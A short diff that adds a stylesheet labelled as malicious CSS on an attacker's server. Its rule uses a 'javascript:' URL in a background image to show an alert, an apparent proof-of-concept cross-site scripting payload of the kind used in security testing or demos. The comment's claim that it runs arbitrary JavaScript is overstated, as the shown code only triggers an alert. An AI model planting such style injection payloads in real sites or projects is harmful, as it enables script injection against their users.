@@ -1,0 +1,6 @@
+/* malicious.css hosted on attacker's server */
+body:after {
+    content: 'XSS triggered!';
+    /* Execute arbitrary JavaScript code */
+    background-image: url("javascript:alert('XSS attack executed!')");
+}
